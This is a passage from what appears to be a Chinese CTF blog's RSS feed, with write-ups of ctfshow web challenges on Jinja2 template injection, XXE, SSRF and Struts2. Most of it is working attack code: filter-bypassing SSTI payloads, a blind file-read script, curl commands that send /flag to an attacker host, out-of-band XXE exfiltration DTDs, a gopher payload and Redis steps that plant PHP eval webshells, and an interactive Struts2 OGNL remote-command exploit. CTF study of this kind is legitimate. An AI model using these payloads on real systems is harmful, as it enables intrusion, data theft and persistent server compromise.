&lt;p&gt;如何得到_?&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;raw&#34;&gt;{% set a=(()|select|string|list)|attr(po)(24)%}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;此时a=_&lt;/p&gt;
&lt;h2 id=&#34;解法三&#34;&gt;&lt;a href=&#34;#解法三&#34; class=&#34;headerlink&#34; title=&#34;解法三&#34;&gt;&lt;/a&gt;解法三&lt;/h2&gt;&lt;p&gt;读文件盲注&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests
import string
def ccchr(s):
    t=&#39;&#39;
    for i in range(len(s)):
        if i&amp;lt;len(s)-1:
            t+=&#39;chr(&#39;+str(ord(s[i]))+&#39;)%2b&#39;
        else:
            t+=&#39;chr(&#39;+str(ord(s[i]))+&#39;)&#39;
    return t
url =&#39;&#39;&#39;http://b134fd30-bddc-4302-8578-8005b96f73c2.chall.ctf.show/?name=
{% set a=(()|select|string|list).pop(24)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set cmd=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}
{% set cmd2=&#39;&#39;&#39;
 
s=string.digits+string.ascii_lowercase+&#39;{_-}&#39;
flag=&#39;&#39;
for i in range(1,50):
	print(i)
	for j in s:
		x=flag+j
		u=url+ccchr(x)+&#39;%}&#39;+&#39;{% if x.open(cmd).read(&#39;+str(i)+&#39;)==cmd2%}&#39;+&#39;1341&#39;+&#39;{% endif%}&#39;
        #print(u)
        r=requests.get(u)
        if(&#34;1341&#34; in r.text):			
            flag=x
            print(flag)
            break
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;解法四&#34;&gt;&lt;a href=&#34;#解法四&#34; class=&#34;headerlink&#34; title=&#34;解法四&#34;&gt;&lt;/a&gt;解法四&lt;/h2&gt;&lt;p&gt;反弹shell，监听 nc -lvp 4567&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;http://da9612ac-2b66-485d-8149-b76a1f03d22c.chall.ctf.show/?name=
{% set a=(()|select|string|list).pop(24)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set cmd=
%}
{%if x.eval(cmd)%}
123
{%endif%}
 
//cmd的值用这个脚本生成
s=&#39;__import__(&#34;os&#34;).popen(&#34;curl http://xxx:4567?p=`cat /flag`&#34;).read()&#39;
def ccchr(s):
    t=&#39;&#39;
    for i in range(len(s)):
        if i&amp;lt;len(s)-1:
            t+=&#39;chr(&#39;+str(ord(s[i]))+&#39;)%2b&#39;
        else:
            t+=&#39;chr(&#39;+str(ord(s[i]))+&#39;)&#39;
    return t
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;web-370&#34;&gt;&lt;a href=&#34;#web-370&#34; class=&#34;headerlink&#34; title=&#34;web 370&#34;&gt;&lt;/a&gt;web 370&lt;/h1&gt;&lt;p&gt;经测试，相比之前又过滤掉了数字&lt;/p&gt;
&lt;p&gt;获取数字的话有两个方法&lt;/p&gt;
&lt;h2 id=&#34;方法一&#34;&gt;&lt;a href=&#34;#方法一&#34; class=&#34;headerlink&#34; title=&#34;方法一&#34;&gt;&lt;/a&gt;方法一&lt;/h2&gt;&lt;p&gt;&lt;code&gt;index()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;用来获取索引值&lt;/p&gt;
&lt;h2 id=&#34;方法二&#34;&gt;&lt;a href=&#34;#方法二&#34; class=&#34;headerlink&#34; title=&#34;方法二&#34;&gt;&lt;/a&gt;方法二&lt;/h2&gt;&lt;p&gt;&lt;code&gt;length()/count()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;用来获取长度值(注意&lt;code&gt;%2b&lt;/code&gt;防止&lt;code&gt;+&lt;/code&gt;被解析为空格)&lt;br&gt;$$&lt;br&gt;24 = (2^2)^2 + 2 ^ 3\&lt;br&gt;47 = (2^2)^2 * 3 - 1\&lt;br&gt;102 = ((2^2)^2+1) * 2 * 3\&lt;br&gt;108 = ((2^2)^2+2) * 2 * 3\&lt;br&gt;97 = ((2^2)^2) * 2 * 3\&lt;br&gt;103 = ((2^2)^2+1) * 2 * 3 + 1&lt;br&gt;$$&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;raw&#34;&gt;?name=
{% set po=dict(po=a,p=a)|join%}
{% set one = (dict(a=a)|join|length) %}
{% set two = (dict(aa=a)|join|length) %}
{% set three = (dict(aaa=a)|join|length) %}
{% set a=(()|select|string|list)|attr(po)(two**two**two%2btwo**three) %}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set file=chr(three*(two**two**two)-one)%2bchr(two*three*(two**two**two%2bone))%2bchr(two*three*(two**two**two%2btwo))%2bchr(two*three*(two**two**two)%2bone)%2bchr(two*three*(two**two**two%2bone)%2bone)%}
{% print(x.open(file).read()) %}
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;web-371&#34;&gt;&lt;a href=&#34;#web-371&#34; class=&#34;headerlink&#34; title=&#34;web 371&#34;&gt;&lt;/a&gt;web 371&lt;/h1&gt;&lt;p&gt;ban掉了print，这里使用反弹shell&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;raw&#34;&gt;?name=
{% set c=(t|count)%}
{% set cc=(dict(e=a)|join|count)%}
{% set ccc=(dict(ee=a)|join|count)%}
{% set cccc=(dict(eee=a)|join|count)%}
{% set ccccc=(dict(eeee=a)|join|count)%}
{% set cccccc=(dict(eeeee=a)|join|count)%}
{% set ccccccc=(dict(eeeeee=a)|join|count)%}
{% set cccccccc=(dict(eeeeeee=a)|join|count)%}
{% set ccccccccc=(dict(eeeeeeee=a)|join|count)%}
{% set cccccccccc=(dict(eeeeeeeee=a)|join|count)%}
{% set ccccccccccc=(dict(eeeeeeeeee=a)|join|count)%}
{% set cccccccccccc=(dict(eeeeeeeeeee=a)|join|count)%}
{% set coun=(ccc~ccccc)|int%}
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(coun)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set cmd=
%}
{%if x.eval(cmd)%}
abc
{%endif%}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;cmd&lt;/code&gt;的内容用以下python脚本跑出&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;def aaa(t):
    t=&#39;(&#39;+(int(t[:-1:])+1)*&#39;c&#39;+&#39;~&#39;+(int(t[-1])+1)*&#39;c&#39;+&#39;)|int&#39;
    return t
ip = &#34;&#34;
port = 56414
s=f&#39;__import__(&#34;os&#34;).popen(&#34;curl {ip}:{port}?p=`cat /flag`&#34;).read()&#39;
def ccchr(s):
    t=&#39;&#39;
    for i in range(len(s)):
        if i&amp;lt;len(s)-1:
            t+=&#39;chr(&#39;+aaa(str(ord(s[i])))+&#39;)%2b&#39;
        else:
            t+=&#39;chr(&#39;+aaa(str(ord(s[i])))+&#39;)&#39;
    return t
print(ccchr(s))
&lt;/code&gt;&lt;/pre&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://dpm12345.cn/posts/e93ac459/</guid>
            <title>XXE</title>
            <link>http://dpm12345.cn/posts/e93ac459/</link>
            <category>CTF</category>
            <category>ctfshow</category>
            <pubDate>Mon, 20 Mar 2023 20:15:40 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;web-373&#34;&gt;&lt;a href=&#34;#web-373&#34; class=&#34;headerlink&#34; title=&#34;web 373&#34;&gt;&lt;/a&gt;web 373&lt;/h1&gt;&lt;p&gt;burp进行提交，hackbar影响上传&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;xml&#34;&gt;&amp;lt;!DOCTYPE test [
&amp;lt;!ENTITY xxe SYSTEM &#34;file:///flag&#34;&amp;gt;
]&amp;gt;
&amp;lt;zhong&amp;gt;
&amp;lt;ctfshow&amp;gt;&amp;amp;xxe;&amp;lt;/ctfshow&amp;gt;
&amp;lt;/zhong&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;web374-376&#34;&gt;&lt;a href=&#34;#web374-376&#34; class=&#34;headerlink&#34; title=&#34;web374~376&#34;&gt;&lt;/a&gt;web374~376&lt;/h1&gt;&lt;p&gt;可以引用外部实体，在服务器写以下文件&lt;/p&gt;
&lt;p&gt;exp.php&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
$content = $_GET[&#39;1&#39;];
if(isset($content)){
    file_put_contents(&#39;flag.txt&#39;,&#34;flag如下\n&#34;.$content);
}else{
    echo &#39;no data input&#39;;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;xxe.xml&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;xml&#34;&gt;&amp;lt;!ENTITY % all
&#34;&amp;lt;!ENTITY &amp;amp;#x25; send SYSTEM &#39;http://xxx.xxx.xxx.xxx/exp.php?1=%file;&#39;&#34;
&amp;gt;
%all;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;payload为&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;xml&#34;&gt;&amp;lt;!DOCTYPE ANY[
&amp;lt;!ENTITY % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=/flag&#34;&amp;gt;
&amp;lt;!ENTITY % remote SYSTEM &#34;http://xxx.xxx.xxx.xxx/xxe.xml&#34;&amp;gt;
%remote;
%send;
]&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到flag&lt;/p&gt;
&lt;h1 id=&#34;web-377&#34;&gt;&lt;a href=&#34;#web-377&#34; class=&#34;headerlink&#34; title=&#34;web 377&#34;&gt;&lt;/a&gt;web 377&lt;/h1&gt;&lt;p&gt;&lt;code&gt;if(preg_match(&#39;/&amp;lt;\?xml version=&#34;1\.0&#34;|http/i&#39;, $xmlfile))&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;增加了对&lt;code&gt;http&lt;/code&gt;的过滤&lt;/p&gt;
&lt;p&gt;利用 utf-16 编码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;a =&#39;&#39;&#39;
&amp;lt;!DOCTYPE ANY[
&amp;lt;!ENTITY % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=/flag&#34;&amp;gt;
&amp;lt;!ENTITY % remote SYSTEM &#34;http://xxx.xxx.xxx.xxx/xxe.xml&#34;&amp;gt;
%remote;
%send;
]&amp;gt;&#39;&#39;&#39;
import requests


data = a.encode(&#39;utf-16&#39;)

url = &#39;http://129c32f8-755b-4686-ad48-257a0011c8aa.challenge.ctf.show/&#39;

requests.post(url=url,data=data)
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;web-378&#34;&gt;&lt;a href=&#34;#web-378&#34; class=&#34;headerlink&#34; title=&#34;web 378&#34;&gt;&lt;/a&gt;web 378&lt;/h1&gt;&lt;p&gt;抓包，可以发现用户，密码用&lt;code&gt;XML&lt;/code&gt;形式发送&lt;/p&gt;
&lt;p&gt;可以直接回显&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;xml&#34;&gt;&amp;lt;!DOCTYPE ANY[
&amp;lt;!ENTITY file SYSTEM &#34;file:///flag&#34;&amp;gt;
]&amp;gt;
&amp;lt;user&amp;gt;
&amp;lt;username&amp;gt;&amp;amp;file;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;1&amp;lt;/password&amp;gt;&amp;lt;/user&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://dpm12345.cn/posts/fe1aa8c3/</guid>
            <title>XSS</title>
            <link>http://dpm12345.cn/posts/fe1aa8c3/</link>
            <category>CTF</category>
            <category>ctfshow</category>
            <pubDate>Mon, 20 Mar 2023 20:15:40 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;web-316&#34;&gt;&lt;a href=&#34;#web-316&#34; class=&#34;headerlink&#34; title=&#34;web 316&#34;&gt;&lt;/a&gt;web 316&lt;/h1&gt; ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://dpm12345.cn/posts/813434ca/</guid>
            <title>SSRF</title>
            <link>http://dpm12345.cn/posts/813434ca/</link>
            <category>CTF</category>
            <category>ctfshow</category>
            <pubDate>Thu, 16 Mar 2023 22:12:40 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;web-351&#34;&gt;&lt;a href=&#34;#web-351&#34; class=&#34;headerlink&#34; title=&#34;web 351&#34;&gt;&lt;/a&gt;web 351&lt;/h1&gt;&lt;p&gt;网页目录下有flag.php，访问后返回非本地用户无法访问&lt;/p&gt;
&lt;p&gt;于是post参数url &lt;code&gt;url=http://127.0.0.1/flag.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;得到flag&lt;/p&gt;
&lt;h1 id=&#34;web-352&#34;&gt;&lt;a href=&#34;#web-352&#34; class=&#34;headerlink&#34; title=&#34;web 352&#34;&gt;&lt;/a&gt;web 352&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST[&#39;url&#39;];
$x=parse_url($url);
if($x[&#39;scheme&#39;]===&#39;http&#39;||$x[&#39;scheme&#39;]===&#39;https&#39;){
if(!preg_match(&#39;/localhost|127.0.0/&#39;)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die(&#39;hacker&#39;);
}
}
else{
    die(&#39;hacker&#39;);
}
?&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;限定”http”/“https”，且过滤了&lt;code&gt;127.0.0&lt;/code&gt;和&lt;code&gt;localhost&lt;/code&gt;，这涉及到&lt;code&gt;127.0.0.1&lt;/code&gt;的他种写法&lt;/p&gt;
&lt;p&gt;有很多如&lt;code&gt;0&lt;/code&gt;，&lt;code&gt;127.1&lt;/code&gt;,&lt;code&gt;127.0.1&lt;/code&gt;,`&lt;/p&gt;
&lt;p&gt;或者进制转换&lt;/p&gt;
&lt;p&gt;或者写个重定向的网页&lt;/p&gt;
&lt;h1 id=&#34;web-353&#34;&gt;&lt;a href=&#34;#web-353&#34; class=&#34;headerlink&#34; title=&#34;web 353&#34;&gt;&lt;/a&gt;web 353&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST[&#39;url&#39;];
$x=parse_url($url);
if($x[&#39;scheme&#39;]===&#39;http&#39;||$x[&#39;scheme&#39;]===&#39;https&#39;){
if(!preg_match(&#39;/localhost|127\.0\.|\。/i&#39;, $url)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die(&#39;hacker&#39;);
}
}
else{
    die(&#39;hacker&#39;);
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;同上题,使用&lt;code&gt;127.1&lt;/code&gt;,&lt;code&gt;0&lt;/code&gt;等&lt;/p&gt;
&lt;h1 id=&#34;web-354&#34;&gt;&lt;a href=&#34;#web-354&#34; class=&#34;headerlink&#34; title=&#34;web 354&#34;&gt;&lt;/a&gt;web 354&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST[&#39;url&#39;];
$x=parse_url($url);
if($x[&#39;scheme&#39;]===&#39;http&#39;||$x[&#39;scheme&#39;]===&#39;https&#39;){
if(!preg_match(&#39;/localhost|1|0|。/i&#39;, $url)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die(&#39;hacker&#39;);
}
}
else{
    die(&#39;hacker&#39;);
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;不能出现&lt;code&gt;localhost&lt;/code&gt;,&lt;code&gt;1&lt;/code&gt;,&lt;code&gt;0&lt;/code&gt;,&lt;code&gt;。&lt;/code&gt;等字符&lt;/p&gt;
&lt;p&gt;故这里使用302跳转重定向或改本地域名的A记录到127.0.0.1上&lt;/p&gt;
&lt;h1 id=&#34;web-355&#34;&gt;&lt;a href=&#34;#web-355&#34; class=&#34;headerlink&#34; title=&#34;web 355&#34;&gt;&lt;/a&gt;web 355&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST[&#39;url&#39;];
$x=parse_url($url);
if($x[&#39;scheme&#39;]===&#39;http&#39;||$x[&#39;scheme&#39;]===&#39;https&#39;){
$host=$x[&#39;host&#39;];
if((strlen($host)&amp;lt;=5)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die(&#39;hacker&#39;);
}
}
else{
    die(&#39;hacker&#39;);
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;要求长度小于5，那么可以使用&lt;code&gt;127.1&lt;/code&gt;,&lt;code&gt;0&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-356&#34;&gt;&lt;a href=&#34;#web-356&#34; class=&#34;headerlink&#34; title=&#34;web 356&#34;&gt;&lt;/a&gt;web 356&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST[&#39;url&#39;];
$x=parse_url($url);
if($x[&#39;scheme&#39;]===&#39;http&#39;||$x[&#39;scheme&#39;]===&#39;https&#39;){
$host=$x[&#39;host&#39;];
if((strlen($host)&amp;lt;=3)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die(&#39;hacker&#39;);
}
}
else{
    die(&#39;hacker&#39;);
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;长度小于3.使用&lt;code&gt;0&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-357&#34;&gt;&lt;a href=&#34;#web-357&#34; class=&#34;headerlink&#34; title=&#34;web 357&#34;&gt;&lt;/a&gt;web 357&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST[&#39;url&#39;];
$x=parse_url($url);
if($x[&#39;scheme&#39;]===&#39;http&#39;||$x[&#39;scheme&#39;]===&#39;https&#39;){
$ip = gethostbyname($x[&#39;host&#39;]);
echo &#39;&amp;lt;/br&amp;gt;&#39;.$ip.&#39;&amp;lt;/br&amp;gt;&#39;;
if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
    die(&#39;ip!&#39;);
}


echo file_get_contents($_POST[&#39;url&#39;]);
}
else{
    die(&#39;scheme&#39;);
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;302跳转&lt;/p&gt;
&lt;h1 id=&#34;web-358&#34;&gt;&lt;a href=&#34;#web-358&#34; class=&#34;headerlink&#34; title=&#34;web 358&#34;&gt;&lt;/a&gt;web 358&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST[&#39;url&#39;];
$x=parse_url($url);
if(preg_match(&#39;/^http:\/\/ctf\..*show$/i&#39;,$url)){
    echo file_get_contents($url);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;payload:&lt;code&gt;http://ctf.@127.0.0.1/flag.php?show&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-359&#34;&gt;&lt;a href=&#34;#web-359&#34; class=&#34;headerlink&#34; title=&#34;web 359&#34;&gt;&lt;/a&gt;web 359&lt;/h1&gt;&lt;p&gt;利用&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;raw&#34;&gt;Give MySQL username: root                                                                          
Give query to execute: select &#34;&amp;lt;?php eval($_POST[1]);?&amp;gt;&#34; into outfile &#34;/var/www/html/1.php&#34;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;raw&#34;&gt;gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%01%00%00%00%01
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在&lt;code&gt;check.php&lt;/code&gt;上post参数&lt;code&gt;returl=xxx&lt;/code&gt;，其中下划线后面的要url编码，使网站目录下生成含一句话木马的&lt;code&gt;1.php&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-360&#34;&gt;&lt;a href=&#34;#web-360&#34; class=&#34;headerlink&#34; title=&#34;web 360&#34;&gt;&lt;/a&gt;web 360&lt;/h1&gt;&lt;p&gt;根据题目提示，打redis&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;raw&#34;&gt;What do you want?? (ReverseShell/PHPShell): PHPShell

Give web root location of server (default is /var/www/html):                                       
Give PHP Payload (We have default PHP Shell): &amp;lt;?php eval($_POST[1]);?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;访问&lt;code&gt;shell.php&lt;/code&gt;，然后正常rce&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://dpm12345.cn/posts/7f1ae6d2/</guid>
            <title>java</title>
            <link>http://dpm12345.cn/posts/7f1ae6d2/</link>
            <category>CTF</category>
            <category>ctfshow</category>
            <pubDate>Thu, 16 Mar 2023 22:12:40 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;web-279-294-296-297&#34;&gt;&lt;a href=&#34;#web-279-294-296-297&#34; class=&#34;headerlink&#34; title=&#34;web 279-294 296-297&#34;&gt;&lt;/a&gt;web 279-294 296-297&lt;/h1&gt;&lt;p&gt;脚本通杀 下载 下载链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0hhdEJveS9TdHJ1dHMyLVNjYW4=&#34;&gt;https://github.com/HatBoy/Struts2-Scan&lt;/span&gt;&lt;br&gt;具体用法在md文件中，例如&lt;br&gt;检测&lt;br&gt;&lt;code&gt;python Struts2Scan.py -u http://94c4c47e-4fb3-408c-97d7-56a5094f84a7.chall.ctf.show/S2-001/login.action&lt;/code&gt;&lt;br&gt;利用&lt;br&gt;&lt;code&gt;python Struts2Scan.py -u http://94c4c47e-4fb3-408c-97d7-56a5094f84a7.chall.ctf.show/S2-001/login.action -n S2-001 --exec&lt;/code&gt;&lt;br&gt;执行命令env即可得到flag&lt;/p&gt;
&lt;h1 id=&#34;web-295&#34;&gt;&lt;a href=&#34;#web-295&#34; class=&#34;headerlink&#34; title=&#34;web 295&#34;&gt;&lt;/a&gt;web 295&lt;/h1&gt;&lt;p&gt;漏洞点在：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzg0NmNlMzM0LTU5ZDAtNGRjMS1iNzhkLTE5NDA4OWFjM2JlOS5jaGFsbGVuZ2UuY3RmLnNob3cvUzItMDQ4L2ludGVncmF0aW9uL3NhdmVHYW5nc3Rlci5hY3Rpb24=&#34;&gt;http://846ce334-59d0-4dc1-b78d-194089ac3be9.challenge.ctf.show/S2-048/integration/saveGangster.action&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import json,re
import requests
import threading
import urllib.parse
import base64

def Poc(url,command):
    header = {&#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;}
    poc = {&#34;name&#34;:&#34;%{(#szgx=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39; \
                          &#34;+command+&#34;&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.close())}&#34;,&#34;age&#34;:&#34;1&#34;,&#34;__checkbox_bustedBefore&#34;:&#34;true&#34;,&#34;description&#34;:&#34;123123&#34;}
    data = urllib.parse.urlencode(poc)
    try:
        result = requests.post(url,data=data,headers=header)
        if result.status_code == 200:
            
            print(result.content)
    except requests.ConnectionError as e:
        print(e)

th = {&#34;url&#34;:&#34;&#34;}

while True:
    if th.get(&#34;url&#34;) != &#34;&#34;:
        input_cmd = input(&#34;cmd &amp;gt;&amp;gt;: &#34;)
        if input_cmd == &#34;exit&#34;:
            exit()
        elif input_cmd == &#39;set&#39;:
            url = input(&#34;set url :&#34;)
            th[&#39;url&#39;] = url
        elif input_cmd == &#39;show url&#39;:
            print(th.get(&#34;url&#34;))
        else:
            Poc(th.get(&#34;url&#34;),input_cmd)
    else:
        url = input(&#34;set url :&#34;)
        th[&#34;url&#34;] = url
&lt;/code&gt;&lt;/pre&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://dpm12345.cn/posts/9e150aa2/</guid>
            <title>代码审计</title>
            <link>http://dpm12345.cn/posts/9e150aa2/</link>
            <category>CTF</category>
            <pubDate>Sun, 15 Jan 2023 22:53:15 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;web-301&#34;&gt;&lt;a href=&#34;#web-301&#34; class=&#34;headerlink&#34; title=&#34;web 301&#34;&gt;&lt;/a&gt;web 301&lt;/h1&gt;&lt;p&gt;下载源码文件，发现在&lt;code&gt;checklogin.php&lt;/code&gt;文件中的sql查询语句没有过滤&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;$sql=&#34;select sds_password from sds_user where sds_username=&#39;&#34;.$username.&#34;&#39; order by id limit 1;&#34;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;而&lt;code&gt;$username&lt;/code&gt;是可控的，故可以用sqlmap爆破出密码，或者写一句话木马文件&lt;/p&gt;
&lt;h2 id=&#34;sqlmap&#34;&gt;&lt;a href=&#34;#sqlmap&#34; class=&#34;headerlink&#34; title=&#34;sqlmap&#34;&gt;&lt;/a&gt;sqlmap&lt;/h2&gt;&lt;p&gt;运行脚本&lt;/p&gt;
